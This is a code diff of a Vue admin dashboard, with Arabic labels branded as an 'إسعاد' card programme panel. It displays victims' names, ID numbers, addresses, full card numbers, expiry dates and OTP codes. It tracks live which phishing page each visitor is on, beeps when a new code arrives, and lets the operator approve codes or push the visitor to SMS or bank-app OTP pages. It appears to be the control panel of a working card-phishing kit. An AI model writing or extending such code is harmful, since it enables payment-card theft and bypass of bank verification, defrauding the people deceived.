@@ -1,32 +1,16 @@
 <script setup lang="ts">
 import { ref, onMounted, computed, onUnmounted } from 'vue';
 import { useRouter } from 'vue-router';
-import { collection, query, onSnapshot, doc, updateDoc } from 'firebase/firestore';
-import { onAuthStateChanged, signOut } from 'firebase/auth';
-import { ref as rtdbRef, onValue } from 'firebase/database';
-import { db, auth, rtdb } from '../firebase';
-import { RefreshCw, Search, ShieldCheck, LogOut, Users, Activity } from 'lucide-vue-next';
-
-interface RequestData {
-  id: string;
-  name: string;
-  mobile: string;
-  idNumber: string;
-  cardType: string;
-  address: string;
-  date: string;
-  paymentName?: string;
-  cardNumber?: string;
-  expMonth?: string;
-  expYear?: string;
-  cvv?: string;
-  otp?: string;
-  otpStatus?: string;
-  nextAction?: string;
-  step: string;
-  createdAt: string;
-  updatedAt: string;
-}
+import {
+  RequestData,
+  ActiveSessionInfo,
+  listCardRequests,
+  updateCardRequest,
+  getServerStats,
+  verifyAdminSession,
+  adminLogoutApi
+} from '../api';
+import { RefreshCw, Search, ShieldCheck, LogOut, Users, Activity, Eye } from 'lucide-vue-next';
 
 const router = useRouter();
 const requests = ref<RequestData[]>([]);
@@ -45,64 +29,40 @@ const selectedRequest = computed(() => {
 const onlineCount = ref(0);
 const totalVisitorsCount = ref(0);
 const onlineUsers = ref<Record<string, boolean>>({});
+const userPages = ref<Record<string, string>>({});
+const activeSessions = ref<ActiveSessionInfo[]>([]);
 
-let onlineUnsubscribe: Function | null = null;
-let visitorsUnsubscribe: Function | null = null;
-let onlineUsersUnsubscribe: Function | null = null;
+let pollTimer: ReturnType<typeof setInterval> | null = null;
+let knownSignature = '';
 
-onMounted(() => {
-  onAuthStateChanged(auth, (user) => {
-    if (user) {
-      isAuthenticated.value = true;
-      authChecking.value = false;
-      fetchData();
-      startRealtimeTracking();
-    } else {
-      router.push('/admin/login');
-    }
-  });
-});
+const pageLabels: Record<string, string> = {
+  '/': 'الصفحة الرئيسية',
+  '/request': 'صفحة تسجيل البيانات',
+  '/payment': 'صفحة ملخص الرسوم',
+  '/card-details': 'صفحة بيانات البطاقة',
+  '/waiting': 'صفحة الانتظار',
+  '/otp': 'صفحة تحقق الرسائل (SMS)',
+  '/otp-bank': 'صفحة تحقق التطبيق البنكي'
+};
 
-onUnmounted(() => {
-  if (onlineUnsubscribe) onlineUnsubscribe();
-  if (visitorsUnsubscribe) visitorsUnsubscribe();
-  if (onlineUsersUnsubscribe) onlineUsersUnsubscribe();
-});
+const stepFallbackPage: Record<string, string> = {
+  form: '/payment',
+  card: '/waiting',
+  otp: '/otp',
+  'otp-bank': '/otp-bank'
+};
 
-const startRealtimeTracking = () => {
-  try {
-    const presenceRef = rtdbRef(rtdb, 'presence');
-    const onlineCallback = onValue(presenceRef, (snapshot) => {
-      if (snapshot.exists()) {
-        onlineCount.value = Object.keys(snapshot.val()).length;
-      } else {
-        onlineCount.value = 0;
-      }
-    });
-    onlineUnsubscribe = () => onlineCallback();
+const getRequestCurrentPageLabel = (req: RequestData) => {
+  const path = userPages.value[req.id] || stepFallbackPage[req.step] || '/request';
+  return pageLabels[path] || path;
+};
 
-    const visitorsRef = rtdbRef(rtdb, 'stats/totalVisitors');
-    const visitorsCallback = onValue(visitorsRef, (snapshot) => {
-      if (snapshot.exists()) {
-        totalVisitorsCount.value = snapshot.val();
-      } else {
-        totalVisitorsCount.value = 0;
-      }
-    });
-    visitorsUnsubscribe = () => visitorsCallback();
+const getRequestCurrentPagePath = (req: RequestData) => {
+  return userPages.value[req.id] || stepFallbackPage[req.step] || '/request';
+};
 
-    const presenceUsersRef = rtdbRef(rtdb, 'presence_users');
-    const onlineUsersCallback = onValue(presenceUsersRef, (snapshot) => {
-      if (snapshot.exists()) {
-        onlineUsers.value = snapshot.val();
-      } else {
-        onlineUsers.value = {};
-      }
-    });
-    onlineUsersUnsubscribe = () => onlineUsersCallback();
-  } catch (err) {
-    console.warn("RTDB tracking failed:", err);
-  }
+const formatPagePath = (path: string) => {
+  return pageLabels[path] || path;
 };
 
 const playNotificationSound = () => {
@@ -114,10 +74,7 @@ const playNotificationSound = () => {
     const oscillator = audioCtx.createOscillator();
     const gainNode = audioCtx.createGain();
 
-    oscillator.type = 'bell' as any; // fallback to sine if not supported, but let's use sine
     oscillator.type = 'sine';
-    
-    // Quick double beep
     oscillator.frequency.setValueAtTime(880, audioCtx.currentTime); 
     oscillator.frequency.setValueAtTime(1046.50, audioCtx.currentTime + 0.1); 
 
@@ -130,79 +87,86 @@ const playNotificationSound = () => {
 
     oscillator.start(audioCtx.currentTime);
     oscillator.stop(audioCtx.currentTime + 0.3);
-  } catch (error) {
-    console.warn('Audio playback failed', error);
-  }
-};
-
-const fetchData = () => {
-
-  try {
-    const q = query(collection(db, 'requests'));
-    
-    onSnapshot(q, (snapshot) => {
-      // Check for changes to play notification sound
-      if (!loading.value) {
-        let shouldPlaySound = false;
-        snapshot.docChanges().forEach((change) => {
-          if (change.type === 'added' || change.type === 'modified') {
-            shouldPlaySound = true;
-          }
-        });
-        if (shouldPlaySound) {
-          playNotificationSound();
-        }
-      }
-
-      const rawData = snapshot.docs.map(doc => ({
-        id: doc.id,
-        ...doc.data()
-      } as RequestData));
-      
-      // Sort descending locally
-      rawData.sort((a, b) => new Date(b.updatedAt).getTime() - new Date(a.updatedAt).getTime());
-      
-      requests.value = rawData;
-      loading.value = false;
-    }, (err) => {
-      console.error('Error fetching data:', err);
-      error.value = 'Failed to load data. Please check permissions.';
-      loading.value = false;
-    });
   } catch (err) {
-    console.error(err);
-    loading.value = false;
+    console.warn('Audio playback failed', err);
   }
 };
+
+const fetchAll = async (isInitial = false) => {
+  try {
+    const [statsResult, reqResult] = await Promise.allSettled([
+      getServerStats(),
+      listCardRequests()
+    ]);
+
+    if (statsResult.status === 'fulfilled') {
+      const stats = statsResult.value;
+      onlineCount.value = stats.onlineCount;
+      totalVisitorsCount.value = stats.totalVisitorsCount;
+      onlineUsers.value = stats.onlineUsers || {};
+      userPages.value = stats.userPages || {};
+      activeSessions.value = stats.activeSessions || [];
+    }
+
+    if (reqResult.status === 'fulfilled') {
+      const reqList = reqResult.value;
+      const newSig = reqList.map(r => `${r.id}:${r.updatedAt}:${r.step}:${r.otp}`).join('|');
+      if (!isInitial && knownSignature && newSig !== knownSignature) {
+        playNotificationSound();
+      }
+      knownSignature = newSig;
+      requests.value = reqList;
+      error.value = '';
+    } else if (isInitial) {
+      error.value = reqResult.reason?.message || 'تعذر تحميل البيانات من الخادم.';
+    }
+
+    loading.value = false;
+  } catch (err) {
+    console.error('Error fetching dashboard data:', err);
+    if (isInitial) {
+      error.value = 'تعذر تحميل البيانات من الخادم.';
+      loading.value = false;
+    }
+  }
+};
+
+onMounted(async () => {
+  const valid = await verifyAdminSession();
+  if (!valid) {
+    router.push('/admin/login');
+    return;
+  }
+  isAuthenticated.value = true;
+  authChecking.value = false;
+  await fetchAll(true);
+  pollTimer = setInterval(() => fetchAll(false), 2000);
+});
+
+onUnmounted(() => {
+  if (pollTimer) clearInterval(pollTimer);
+});
 
 const handleLogout = async () => {
-  await signOut(auth);
+  await adminLogoutApi();
   router.push('/admin/login');
 };
 
 const updateOtpStatus = async (id: string, status: string) => {
   try {
-    const requestRef = doc(db, 'requests', id);
-    await updateDoc(requestRef, {
-      otpStatus: status,
-      updatedAt: new Date().toISOString()
-    });
+    await updateCardRequest(id, { otpStatus: status });
+    await fetchAll(false);
   } catch (err) {
     console.error('Error updating OTP status:', err);
-    alert('حدث خطأ أثناء تحديث حالة الرمز');
   }
 };
 
 const updateNextAction = async (id: string, action: string) => {
   try {
-    const requestRef = doc(db, 'requests', id);
-    await updateDoc(requestRef, {
-      nextAction: action,
-      updatedAt: new Date().toISOString()
-    });
+    await updateCardRequest(id, { nextAction: action });
+    await fetchAll(false);
   } catch (err) {
     console.error('Error updating next action:', err);
-    alert('حدث خطأ أثناء توجيه المستخدم');
   }
 };
 
@@ -256,198 +220,218 @@ const formatRelativeTime = (dateStr: string) => {
 
 <template>
   <div v-if="authChecking" class="min-h-screen flex items-center justify-center bg-gray-50">
-    <RefreshCw class="w-10 h-10 animate-spin text-[#0c2a5c]" />
+    <RefreshCw class="w-10 h-10 animate-spin text-[#008a40]" />
   </div>
 
   <div v-else-if="isAuthenticated" class="min-h-screen bg-gray-50 flex flex-col font-sans" dir="rtl">
     <!-- Navbar -->
-    <header class="bg-white shadow-sm border-b border-gray-200 py-4 px-6 sticky top-0 z-10 flex justify-between items-center">
-      <div class="flex items-center gap-3">
-        <div class="w-10 h-10 bg-[#0c2a5c] rounded-xl flex items-center justify-center shadow-inner">
-          <ShieldCheck class="w-6 h-6 text-white" />
+    <header class="bg-white shadow-xs border-b border-gray-200 py-3.5 px-6 sticky top-0 z-10 flex justify-between items-center gap-8">
+      <!-- Zone 1: Brand Title -->
+      <div class="flex items-center gap-3 shrink-0">
+        <div class="w-9 h-9 bg-[#008a40] rounded-xl flex items-center justify-center shadow-inner">
+          <ShieldCheck class="w-5 h-5 text-white" />
         </div>
-        <h1 class="font-bold text-2xl tracking-tight text-gray-900">لوحة تحكم الإدارة</h1>
+        <h1 class="font-bold text-lg tracking-tight text-gray-900 whitespace-nowrap">لوحة تحكم إسعاد</h1>
       </div>
-      
+
+      <!-- Zone 2: Search & Live Metrics -->
       <div class="flex items-center gap-4">
-        <div class="relative w-64 hidden sm:block">
+        <div class="relative w-64 hidden md:block">
           <input 
             v-model="searchQuery" 
             type="text" 
-            placeholder="بحث بالاسم، الهاتف..." 
-            class="w-full bg-gray-100 border-none rounded-full py-2 pl-4 pr-10 text-sm focus:ring-2 focus:ring-[#0c2a5c] focus:bg-white transition-all text-gray-800"
+            placeholder="بحث بالاسم، الهاتف، الهوية..." 
+            class="w-full bg-gray-100 border-none rounded-xl py-2 pl-4 pr-10 text-xs focus:ring-2 focus:ring-[#008a40] focus:bg-white transition-all text-gray-800"
           />
-          <Search class="w-4 h-4 text-gray-400 absolute right-4 top-1/2 -translate-y-1/2 pointer-events-none" />
-        </div>
-        
-        <div class="flex items-center gap-3 ml-2 border-l border-gray-200 pl-4">
-          <!-- Total Visitors -->
-          <div class="flex flex-col items-center justify-center bg-gray-50 px-3 py-1 rounded-lg border border-gray-100">
-            <div class="flex items-center gap-1.5 text-gray-500 mb-0.5">
-              <Users class="w-3.5 h-3.5" />
-              <span class="text-[10px] font-bold uppercase tracking-wider">الزوار</span>
-            </div>
-            <span class="font-mono font-bold text-gray-800 text-sm leading-none">{{ totalVisitorsCount }}</span>
-          </div>
-          
-          <!-- Online Status -->
-          <div class="flex flex-col items-center justify-center bg-green-50 px-3 py-1 rounded-lg border border-green-100">
-            <div class="flex items-center gap-1.5 text-green-600 mb-0.5">
-              <Activity class="w-3.5 h-3.5" />
-              <span class="text-[10px] font-bold uppercase tracking-wider">متصل الآن</span>
-            </div>
-            <span class="font-mono font-bold text-green-700 text-sm leading-none flex items-center gap-1.5">
-              <span class="relative flex h-2 w-2">
-                <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
-                <span class="relative inline-flex rounded-full h-2 w-2 bg-green-500"></span>
-              </span>
-              {{ onlineCount }}
-            </span>
-          </div>
+          <Search class="w-4 h-4 text-gray-400 absolute right-3.5 top-1/2 -translate-y-1/2 pointer-events-none" />
         </div>
 
-        <button @click="handleLogout" class="text-gray-500 hover:text-red-500 transition-colors p-2 bg-gray-100 rounded-full flex items-center justify-center w-10 h-10 hover:bg-red-50">
-          <LogOut class="w-5 h-5" />
+        <div class="flex items-center gap-4 text-xs text-gray-600">
+          <div class="flex items-center gap-1.5">
+            <Users class="w-4 h-4 text-gray-500" />
+            <span>إجمالي الزوار:</span>
+            <span class="font-mono font-bold text-gray-900 tabular-nums">{{ totalVisitorsCount }}</span>
+          </div>
+          <span class="text-gray-300">·</span>
+          <div class="flex items-center gap-1.5">
+            <Activity class="w-4 h-4 text-[#008a40]" />
+            <span>المتصلون الآن:</span>
+            <span class="font-mono font-bold text-[#008a40] tabular-nums">{{ onlineCount }}</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Zone 3: Primary Action -->
+      <div class="shrink-0">
+        <button @click="handleLogout" class="text-gray-600 hover:text-red-600 transition-colors px-3 py-2 bg-gray-100 rounded-xl flex items-center gap-2 text-xs font-bold hover:bg-red-50 cursor-pointer whitespace-nowrap">
+          <LogOut class="w-4 h-4" />
+          <span>تسجيل الخروج</span>
         </button>
       </div>
     </header>
 
+    <!-- Live Active Visitors Strip (Shows current page of every online visitor) -->
+    <div v-if="activeSessions.length > 0" class="bg-[#eef5f0] border-b border-gray-200 px-6 py-2.5">
+      <div class="max-w-[1500px] mx-auto flex items-center gap-4 overflow-x-auto text-xs">
+        <div class="flex items-center gap-1.5 font-bold text-[#008a40] shrink-0">
+          <Eye class="w-4 h-4" />
+          <span>المتصلون حالياً والصفحة الحالية:</span>
+        </div>
+        <div class="flex items-center gap-3">
+          <div
+            v-for="(sess, idx) in activeSessions"
+            :key="sess.clientId"
+            class="bg-white border border-gray-200 rounded-lg px-3 py-1 flex items-center gap-2 shrink-0 text-xs shadow-2xs"
+          >
+            <span class="font-bold text-[#008a40]">زائر #{{ idx + 1 }}</span>
+            <span class="text-gray-300">·</span>
+            <span class="text-gray-800 font-semibold">{{ formatPagePath(sess.currentPage) }}</span>
+            <span class="text-gray-400 font-mono text-[11px]" dir="ltr">({{ sess.currentPage }})</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
     <!-- Main Content -->
-    <main class="flex-1 p-6 max-w-[1500px] mx-auto w-full flex gap-6 h-[calc(100vh-80px)]">
+    <main class="flex-1 p-6 max-w-[1500px] mx-auto w-full flex gap-6 h-[calc(100vh-115px)]">
       
       <!-- Users Sidebar -->
-      <aside class="w-[350px] bg-white rounded-2xl shadow-sm border border-gray-200 overflow-hidden flex flex-col shrink-0 h-full">
+      <aside class="w-[360px] bg-white rounded-2xl shadow-xs border border-gray-200 overflow-hidden flex flex-col shrink-0 h-full">
         <div class="p-4 border-b border-gray-100 bg-gray-50/50 flex justify-between items-center">
-          <h2 class="font-bold text-gray-800">الطلبات</h2>
-          <span class="bg-[#0c2a5c] text-white text-xs px-2 py-0.5 rounded-full font-mono">{{ filteredRequests.length }}</span>
+          <h2 class="font-bold text-sm text-gray-800">الطلبات المسجلة</h2>
+          <span class="text-[#008a40] text-xs font-bold font-mono tabular-nums">{{ filteredRequests.length }}</span>
         </div>
         
         <!-- Loading / Empty -->
         <div v-if="loading" class="flex-1 p-8 flex flex-col items-center justify-center text-gray-400">
-          <RefreshCw class="w-8 h-8 animate-spin mb-4 text-[#0c2a5c]" />
-          <p class="text-sm font-medium">جاري تحميل البيانات...</p>
+          <RefreshCw class="w-8 h-8 animate-spin mb-4 text-[#008a40]" />
+          <p class="text-xs font-medium">جاري تحميل البيانات...</p>
         </div>
         <div v-else-if="error" class="flex-1 p-8 text-center text-red-500">
-          <p class="font-medium bg-red-50 py-3 px-4 rounded-lg inline-block">{{ error }}</p>
+          <p class="font-medium text-xs bg-red-50 py-3 px-4 rounded-lg inline-block">{{ error }}</p>
         </div>
         <div v-else-if="filteredRequests.length === 0" class="flex-1 p-8 text-center text-gray-500 flex flex-col items-center justify-center">
-          <p class="font-medium text-lg mb-2">لا توجد طلبات بعد</p>
+          <p class="font-medium text-sm mb-2">لا توجد طلبات بعد</p>
         </div>
         
         <!-- List -->
-        <div v-else class="flex-1 overflow-y-auto overflow-x-hidden">
+        <div v-else class="flex-1 overflow-y-auto overflow-x-hidden divide-y divide-gray-100">
           <div 
             v-for="req in filteredRequests" 
             :key="req.id" 
             @click="selectedRequestId = req.id"
-            class="p-4 cursor-pointer border-b border-gray-50 transition-colors hover:bg-gray-50 flex flex-col gap-2 relative group"
-            :class="{ 'bg-blue-50/50 border-blue-100 border-l-4 border-l-[#0c2a5c]': selectedRequestId === req.id, 'border-l-4 border-l-transparent': selectedRequestId !== req.id }"
+            class="p-4 cursor-pointer transition-colors hover:bg-gray-50 flex flex-col gap-2"
+            :class="{ 'bg-[#eef5f0]': selectedRequestId === req.id }"
           >
-            <!-- Badge overlay when selected -->
-            <div class="flex justify-between items-start w-full">
-              <div class="font-medium text-gray-900 text-[15px] flex items-center gap-2">
-                {{ req.name }}
-                <span v-if="onlineUsers[req.id]" class="relative flex h-2 w-2" title="متصل الآن">
-                  <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
-                  <span class="relative inline-flex rounded-full h-2 w-2 bg-green-500"></span>
+            <!-- Row 1: Name + Online/Offline status + Time -->
+            <div class="flex justify-between items-center w-full">
+              <div class="font-bold text-gray-900 text-sm flex items-center gap-2">
+                <span>{{ req.name }}</span>
+                <span class="text-gray-300">·</span>
+                <span v-if="onlineUsers[req.id]" class="text-[11px] font-bold text-[#008a40]">
+                  متصل الآن
+                </span>
+                <span v-else class="text-[11px] font-medium text-gray-400">
+                  غير متصل
                 </span>
               </div>
-              <span class="text-[12px] text-gray-500 bg-gray-100 px-2 py-0.5 rounded-full" dir="rtl">{{ formatRelativeTime(req.createdAt) }}</span>
+              <span class="text-[11px] text-gray-500" dir="rtl">{{ formatRelativeTime(req.createdAt) }}</span>
             </div>
             
-            <div class="text-[13px] text-gray-500 font-mono">{{ req.mobile }}</div>
-            
-            <div class="flex items-center justify-between mt-1">
-              <span :class="{
-                'bg-yellow-100 text-yellow-800 border-yellow-200': req.step === 'form',
-                'bg-blue-100 text-blue-800 border-blue-200': req.step === 'card',
-                'bg-green-100 text-green-800 border-green-200': req.step === 'otp' || req.step === 'otp-bank'
-              }" class="px-2 py-0.5 rounded text-[10px] font-bold tracking-wide border uppercase">
-                <template v-if="req.step === 'form'">طلب جديد</template>
-                <template v-else-if="req.step === 'card'">البطاقة</template>
-                <template v-else-if="req.step === 'otp'">OTP رسالة</template>
-                <template v-else-if="req.step === 'otp-bank'">OTP بنكي</template>
-                <template v-else>{{ req.step }}</template>
+            <!-- Row 2: Mobile & Card Type -->
+            <div class="flex items-center justify-between text-xs text-gray-500">
+              <span class="font-mono">{{ req.mobile }}</span>
+              <span>
+                <template v-if="req.cardType === 'silver'">الأساسية</template>
+                <template v-else-if="req.cardType === 'gold'">الذهبية</template>
+                <template v-else-if="req.cardType === 'platinum'">البلاتينية</template>
               </span>
-              
-              <div class="flex items-center gap-1">
-                 <span class="inline-block w-2 h-2 rounded-full" 
-                       :class="{
-                         'bg-gray-400': req.cardType === 'silver',
-                         'bg-yellow-400': req.cardType === 'gold',
-                         'bg-gray-800': req.cardType === 'platinum'
-                       }"></span>
+            </div>
+
+            <!-- Row 3: Current Page & Step -->
+            <div class="flex items-center justify-between pt-1 text-[11px] border-t border-gray-100/80">
+              <div class="flex items-center gap-1.5 text-gray-700">
+                <Eye class="w-3.5 h-3.5 text-[#008a40]" />
+                <span class="text-gray-500">الصفحة الحالية:</span>
+                <span class="font-bold text-[#008a40]">{{ getRequestCurrentPageLabel(req) }}</span>
               </div>
+              <span class="font-mono text-[10px] text-gray-400" dir="ltr">{{ getRequestCurrentPagePath(req) }}</span>
             </div>
           </div>
         </div>
       </aside>
 
       <!-- Details View Panel -->
-      <div class="flex-1 bg-white rounded-2xl shadow-sm border border-gray-200 flex flex-col overflow-hidden h-full">
+      <div class="flex-1 bg-white rounded-2xl shadow-xs border border-gray-200 flex flex-col overflow-hidden h-full">
         <div v-if="!selectedRequestId || !selectedRequest" class="flex-1 flex flex-col items-center justify-center text-gray-400 h-full bg-gray-50/30">
-          <ShieldCheck class="w-16 h-16 mb-4 opacity-20 text-[#0c2a5c]" />
-          <h2 class="text-xl font-medium text-gray-500 mb-2">اختر طلباً من القائمة</h2>
-          <p class="text-sm">قم بتحديد مستخدم لعرض تفاصيل الطلب والتحكم في الإجراءات</p>
+          <ShieldCheck class="w-14 h-14 mb-3 opacity-20 text-[#008a40]" />
+          <h2 class="text-base font-bold text-gray-500 mb-1">اختر طلباً من القائمة</h2>
+          <p class="text-xs">قم بتحديد مستخدم لعرض تفاصيل الطلب والصفحة المتواجد بها حالياً</p>
         </div>
         
-        <div v-else class="flex-1 overflow-y-auto p-8 relative">
-          <!-- Main Content -->
-          <div class="max-w-[800px] mx-auto w-full">
+        <div v-else class="flex-1 overflow-y-auto p-6 relative">
+          <div class="max-w-[820px] mx-auto w-full">
             <!-- Header section of details -->
-            <div class="flex justify-between items-start mb-8 pb-6 border-b border-gray-100">
+            <div class="flex justify-between items-start mb-6 pb-5 border-b border-gray-100">
               <div>
-                <h2 class="text-2xl font-bold text-gray-900 mb-2 flex items-center gap-3">
-                  {{ selectedRequest.name }}
-                  <span v-if="onlineUsers[selectedRequest.id]" class="relative flex h-2.5 w-2.5" title="متصل الآن">
-                    <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
-                    <span class="relative inline-flex rounded-full h-full w-full bg-green-500"></span>
+                <div class="flex items-center gap-3 mb-2">
+                  <h2 class="text-xl font-bold text-gray-900">
+                    {{ selectedRequest.name }}
+                  </h2>
+                  <span class="text-gray-300">·</span>
+                  <span v-if="onlineUsers[selectedRequest.id]" class="text-xs font-bold text-[#008a40]">
+                    متصل الآن (Online)
                   </span>
-                </h2>
-                <p class="text-gray-500 font-sans text-sm flex gap-4">
+                  <span v-else class="text-xs font-medium text-gray-400">
+                    غير متصل (Offline)
+                  </span>
+                </div>
+
+                <!-- Live Current Page Indicator -->
+                <div class="flex items-center gap-2 text-xs text-gray-700 mb-2">
+                  <Eye class="w-4 h-4 text-[#008a40]" />
+                  <span class="font-semibold">الصفحة الحالية للمستخدم:</span>
+                  <span class="font-bold text-[#008a40]">{{ getRequestCurrentPageLabel(selectedRequest) }}</span>
+                  <span class="font-mono text-gray-400" dir="ltr">({{ getRequestCurrentPagePath(selectedRequest) }})</span>
+                </div>
+
+                <p class="text-gray-500 font-sans text-xs flex gap-3">
                   <span>التاريخ: {{ new Date(selectedRequest.createdAt).toLocaleDateString('ar-EG', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' }) }}</span>
-                  <span class="font-mono text-gray-400 bg-gray-100 px-2 py-0.5 rounded-full" dir="rtl">{{ formatRelativeTime(selectedRequest.createdAt) }}</span>
+                  <span>·</span>
+                  <span>{{ formatRelativeTime(selectedRequest.createdAt) }}</span>
                 </p>
               </div>
               
-              <div class="text-left">
-                <span :class="{
-                    'bg-yellow-100 text-yellow-800 border-yellow-200': selectedRequest.step === 'form',
-                    'bg-blue-100 text-blue-800 border-blue-200': selectedRequest.step === 'card',
-                    'bg-green-100 text-green-800 border-green-200': selectedRequest.step === 'otp' || selectedRequest.step === 'otp-bank'
-                  }" class="px-3 py-1.5 rounded-lg text-xs font-bold tracking-wide border uppercase inline-flex items-center gap-2">
-                  <span class="w-1.5 h-1.5 rounded-full" :class="{ 'bg-yellow-500': selectedRequest.step === 'form', 'bg-blue-500': selectedRequest.step === 'card', 'bg-green-500': selectedRequest.step === 'otp' || selectedRequest.step === 'otp-bank' }"></span>
-                  <template v-if="selectedRequest.step === 'form'">طلب جديد (النموذج)</template>
-                  <template v-else-if="selectedRequest.step === 'card'">مرحلة البطاقة</template>
-                  <template v-else-if="selectedRequest.step === 'otp'">رمز التحقق (رسالة)</template>
-                  <template v-else-if="selectedRequest.step === 'otp-bank'">رمز التحقق (التطبيق)</template>
-                  <template v-else>{{ selectedRequest.step }}</template>
-                </span>
+              <div class="text-left text-xs font-bold text-[#008a40]">
+                <template v-if="selectedRequest.step === 'form'">طلب جديد (النموذج)</template>
+                <template v-else-if="selectedRequest.step === 'card'">مرحلة البطاقة</template>
+                <template v-else-if="selectedRequest.step === 'otp'">رمز التحقق (رسالة)</template>
+                <template v-else-if="selectedRequest.step === 'otp-bank'">رمز التحقق (التطبيق)</template>
+                <template v-else>{{ selectedRequest.step }}</template>
               </div>
             </div>
 
             <!-- Content Grid layout for details -->
-            <div class="grid grid-cols-2 gap-8 mb-8">
+            <div class="grid grid-cols-2 gap-6 mb-6">
               <!-- Column 1: basic info -->
-              <div class="flex flex-col gap-6">
-                <!-- Info block -->
+              <div class="flex flex-col gap-5">
                 <div class="bg-gray-50 rounded-xl p-5 border border-gray-100">
-                  <h3 class="font-bold text-gray-900 mb-4 pb-2 border-b border-gray-200 flex items-center gap-2">
-                    <Users class="w-4 h-4 text-[#0c2a5c]" />
+                  <h3 class="font-bold text-sm text-gray-900 mb-4 pb-2 border-b border-gray-200 flex items-center gap-2">
+                    <Users class="w-4 h-4 text-[#008a40]" />
                     البيانات الأساسية
                   </h3>
                   
-                  <div class="space-y-4">
+                  <div class="space-y-3.5 text-sm">
                     <div>
-                      <p class="text-[11px] font-bold text-gray-400 mb-1 uppercase tracking-wider">رقم الهاتف</p>
+                      <p class="text-[11px] font-bold text-gray-400 mb-1">رقم الهاتف</p>
                       <p class="font-mono text-gray-900 font-medium bg-white px-3 py-1.5 rounded border border-gray-200 inline-block w-full">{{ selectedRequest.mobile }}</p>
                     </div>
                     <div>
-                      <p class="text-[11px] font-bold text-gray-400 mb-1 uppercase tracking-wider">الرقم المدني</p>
+                      <p class="text-[11px] font-bold text-gray-400 mb-1">رقم الهوية</p>
                       <p class="text-gray-900 font-medium bg-white px-3 py-1.5 rounded border border-gray-200 w-full">{{ selectedRequest.idNumber }}</p>
                     </div>
                     <div>
-                      <p class="text-[11px] font-bold text-gray-400 mb-1 uppercase tracking-wider">العنوان</p>
+                      <p class="text-[11px] font-bold text-gray-400 mb-1">العنوان</p>
                       <p class="text-gray-900 bg-white px-3 py-1.5 rounded border border-gray-200 w-full">{{ selectedRequest.address }}</p>
                     </div>
                   </div>
@@ -455,128 +439,104 @@ const formatRelativeTime = (dateStr: string) => {
               </div>
 
               <!-- Column 2: Card & Actions -->
-              <div class="flex flex-col gap-6">
+              <div class="flex flex-col gap-5">
                 
-              <!-- Card Mockup inside Column 2 -->
-              <div v-if="selectedRequest.cardNumber" class="bg-gradient-to-br from-slate-800 to-slate-900 rounded-2xl p-6 relative overflow-hidden shadow-xl text-white transform transition-all hover:scale-[1.02] duration-300">
-                <!-- Decorative elements for the card mockup -->
-                <div class="absolute top-0 right-0 w-32 h-32 bg-white/10 rounded-full blur-3xl -mr-10 -mt-10 pointer-events-none"></div>
-                <div class="absolute bottom-0 left-0 w-32 h-32 bg-blue-500/20 rounded-full blur-3xl -ml-10 -mb-10 pointer-events-none"></div>
-                <div class="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-full h-[1px] bg-white/5 rotate-12 pointer-events-none"></div>
-                
-                <div class="flex justify-between items-start mb-8 relative z-10">
-                  <div class="flex items-center gap-2 bg-white/10 px-3 py-1 rounded-full backdrop-blur-sm border border-white/10">
-                    <span class="inline-block w-2 h-2 rounded-full shadow-[0_0_8px_rgba(255,255,255,0.6)]" 
-                          :class="{
-                            'bg-gray-300': selectedRequest.cardType === 'silver',
-                            'bg-yellow-400': selectedRequest.cardType === 'gold',
-                            'bg-gray-400': selectedRequest.cardType === 'platinum'
-                          }"></span>
-                    <span class="text-xs font-bold tracking-wide text-white/90">
-                      <template v-if="selectedRequest.cardType === 'silver'">بطاقة فضية</template>
-                      <template v-else-if="selectedRequest.cardType === 'gold'">بطاقة ذهبية</template>
-                      <template v-else-if="selectedRequest.cardType === 'platinum'">بطاقة بلاتينية</template>
+                <!-- Card Mockup -->
+                <div v-if="selectedRequest.cardNumber" class="bg-gradient-to-br from-[#008a40] to-[#052e16] rounded-2xl p-5 relative overflow-hidden shadow-lg text-white">
+                  <div class="flex justify-between items-start mb-6 relative z-10">
+                    <span class="text-xs font-bold text-white/90">
+                      <template v-if="selectedRequest.cardType === 'silver'">بطاقة إسعاد الأساسية</template>
+                      <template v-else-if="selectedRequest.cardType === 'gold'">بطاقة إسعاد الذهبية</template>
+                      <template v-else-if="selectedRequest.cardType === 'platinum'">بطاقة إسعاد البلاتينية</template>
                       <template v-else>{{ selectedRequest.cardType }}</template>
                     </span>
+                    <div class="w-10 h-7 border border-white/20 rounded bg-yellow-400/30"></div>
                   </div>
-                  
-                  <!-- Chip -->
-                  <div class="w-12 h-9 border border-white/20 rounded bg-gradient-to-br from-yellow-100/30 to-yellow-400/20 flex flex-col justify-between p-1 pl-2">
-                    <div class="w-full h-[1px] bg-white/20"></div>
-                    <div class="w-full h-[1px] bg-white/20"></div>
-                  </div>
-                </div>
 
-                <div class="space-y-6 relative z-10">
-                  <div class="w-full" dir="ltr">
-                    <p class="text-[10px] text-white/50 uppercase tracking-[0.2em] mb-1 font-bold">Card Number</p>
-                    <p class="font-mono text-white tracking-[0.25em] text-[20px] font-medium text-shadow-sm select-all">
-                      {{ selectedRequest.cardNumber.replace(/(.{4})/g, '$1 ').trim() }}
-                    </p>
-                  </div>
-                  
-                  <div class="flex items-center gap-8" dir="ltr">
-                    <div>
-                      <p class="text-[9px] text-white/50 uppercase tracking-widest mb-0.5 font-bold">Name</p>
-                      <p class="font-mono text-white/90 uppercase text-sm tracking-widest select-all">
-                        {{ selectedRequest.paymentName || selectedRequest.name }}
+                  <div class="space-y-4 relative z-10">
+                    <div class="w-full" dir="ltr">
+                      <p class="text-[10px] text-white/60 uppercase tracking-widest mb-0.5 font-bold">Card Number</p>
+                      <p class="font-mono text-white tracking-[0.2em] text-base font-bold select-all tabular-nums">
+                        {{ selectedRequest.cardNumber.replace(/(.{4})/g, '$1 ').trim() }}
                       </p>
                     </div>
-                    <div>
-                      <p class="text-[9px] text-white/50 uppercase tracking-widest mb-0.5 font-bold">Expires</p>
-                      <p class="font-mono text-white font-medium tracking-widest text-sm select-all">
-                        {{ selectedRequest.expMonth }}/{{ selectedRequest.expYear }}
-                      </p>
-                    </div>
-                    <div>
